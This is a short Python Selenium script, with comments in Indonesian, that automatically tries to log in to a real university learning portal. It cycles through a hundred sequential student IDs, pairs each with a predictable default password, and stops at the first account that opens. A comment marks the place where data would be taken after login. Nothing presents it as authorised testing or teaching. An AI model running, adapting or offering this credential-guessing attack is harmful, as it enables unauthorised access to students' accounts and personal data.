from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

data = []
default_nim = "H071241"
default_password = "h071241"

for i in range(1, 101):
    try:
        driver = webdriver.Chrome()
        driver.get("https://sikola-v2.unhas.ac.id/login/index.php") 

        try_nim = default_nim + f"{i:03d}"
        try_password = default_password + f"{i:03d}" + "@2023!"

        # Masukkan NIM
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "username"))
        ).send_keys(try_nim)

        # Masukkan password
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        ).send_keys(try_password)

        # Klik tombol login
        driver.find_element(By.ID, "loginbtn").click()
        print(f"Trying to login with NIM: {try_nim}")

        # Tunggu jika elemen error login muncul
        time.sleep(2)  # Beri waktu untuk menampilkan pesan error

        # Cek apakah elemen error ada
        try:
            error_message = driver.find_element(By.ID, "loginerrormessage")
            if error_message.is_displayed():
                print(f"Login failed for NIM: {try_nim}")
                continue  # Lanjutkan ke iterasi berikutnya jika login gagal
        except:
            print(f"Login successful for NIM: {try_nim}")
            # Tambahkan logika untuk mengambil data jika login berhasil
            break  # Jika login berhasil, keluar dari loop

    except Exception as e:
        print(f"Error encountered: {str(e)}")
        continue  # Lanjutkan ke NIM berikutnya jika ada error

    finally:
        driver.quit()  # Tutup browser setelah setiap percobaan
